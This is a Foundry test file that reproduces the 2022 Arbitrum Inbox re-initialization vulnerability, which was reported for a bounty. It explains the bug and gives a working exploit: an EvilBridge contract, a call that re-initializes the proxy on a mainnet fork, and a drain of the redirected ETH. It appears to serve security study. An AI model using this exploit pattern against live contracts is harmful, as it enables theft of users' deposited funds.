// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {TestHarness} from "../TestHarness.sol";
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
import {ECCUtils} from '../interfaces/PolyNetworkLibraries/ETHCrossChainUtils.sol';

// forge test --match-contract Report_ArbitrumInbox -vvv
/*

On September 2022, 0xriptide published a Medium article describing a vulnerability in the Arbitrum bridge.
He reported the vulnerability and was awarded 400 ETH as a reward by Offchain Labs.

The vulnerability was relatively simple, although the conditions by which it was made exploitable are interesting.


// Attack Overview
Total Lost: 400 ETH in Bounty price
Target Contract: Arbitrum's Inbox.sol (https://github.com/OffchainLabs/nitro/tree/master/contracts/src/bridge/Inbox.sol)

// Key Info Sources
Writeup: https://medium.com/@0xriptide/hackers-in-arbitrums-inbox-ca23272641a2

Principle: Re-initializable implementation contract

Code with added comments tagged @reproduced:

    // @reproduced: initialize method that serves as constructor in contract implementation
    // @reproduced: of proxy
    function initialize(IBridge _bridge, ISequencerInbox _sequencerInbox)
        external
        // @reproduced: initializer allows calling the function only if the function
        // @reproduced: has not been called before, uses flag at slot 0x00 to mark if it has been called
        // @reproduced: see https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/proxy/utils/Initializable.sol
        initializer
        onlyDelegated
    {
        bridge = _bridge;
        sequencerInbox = _sequencerInbox;
        allowListEnabled = false;
        __Pausable_init();
    }

    /// @dev function to be called one time during the inbox upgrade process
    /// this is used to fix the storage slots
    function postUpgradeInit(IBridge _bridge) external onlyDelegated onlyProxyOwner {
        // @reproduced: implementation now wipes 0x00, 0x01, 0x02 slots from the storage
        // @reproduced: allowing `initialize` to be called by anyone again
        uint8 slotsToWipe = 3;
        for (uint8 i = 0; i < slotsToWipe; i++) {
            assembly {
                sstore(i, 0)
            }
        }
        allowListEnabled = false;
        bridge = _bridge;
    }
/**


ATTACK:
Simply call `initialize` through the proxy contract setting your own `_bridge` contract.
This will make it so all `ethDeposit`  in the Inbox send the ETH to your bidge contract.

*/

interface IArbitrumInbox {
    function initialize(address _bridge, address _sequencerInbox) external;
    function depositEth() external payable;
}

contract EvilBridge {

    address public immutable owner;
    fallback() external payable {}
    receive() external payable {}

    constructor() {
        owner = msg.sender;
    }

    function enqueueDelayedMessage(uint8, address, bytes32) external payable returns(uint256) {
        console.log("Victim's value received: %s", msg.value);
        // returns silly fake message number
        return 9999;
    }

    function drain() external {
        payable(owner).transfer(address(this).balance);
    }
}

contract Report_ArbitrumInbox is TestHarness, TokenBalanceTracker {
    using stdStorage for StdStorage;

    address internal attacker = address(0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963);
    IArbitrumInbox internal arbitrumInbox = IArbitrumInbox(0x4Dbd4fc535Ac27206064B68FfCf827b0A60BAB3f);
    //vulnerable implementation 0x3e2198a77fc6b266082b92859092170763548730
    EvilBridge evilBridge;


    function setUp() external {
        // The upgrade was activated at block 15447157 (I did a bisection over history with anvil + cast, was not fun do not try)
        // By block 15460000 it was patched with no change in the implementation,
        // probably by re-initializing the contract and avoiding calling the postUpgradeInit method
        cheat.createSelectFork("mainnet", 15450000); // fork number fairly arbitrary, just when contract existed but before it was patched

        updateBalanceTracker(attacker);
        updateBalanceTracker(address(arbitrumInbox));
    }

    function test_attack() external {
        logBalancesWithLabel("Balances of attacker contract before:", attacker);
        uint balanceBefore = attacker.balance;

        cheat.startPrank(attacker);
        evilBridge = new EvilBridge();

        console.log("Attacker re-initializes bridge with their evil bridge.");
        arbitrumInbox.initialize(address(evilBridge), address(0x00));

        cheat.stopPrank();

        arbitrumInbox.depositEth{value: 100 ether}();
        evilBridge.drain();
        uint balanceAfter = attacker.balance;

        updateBalanceTracker(attacker);
        updateBalanceTracker(address(arbitrumInbox));
        logBalancesWithLabel("Balances of attacker contract after:", attacker);


        assertEq(balanceAfter - balanceBefore, 100 ether);
    }
}
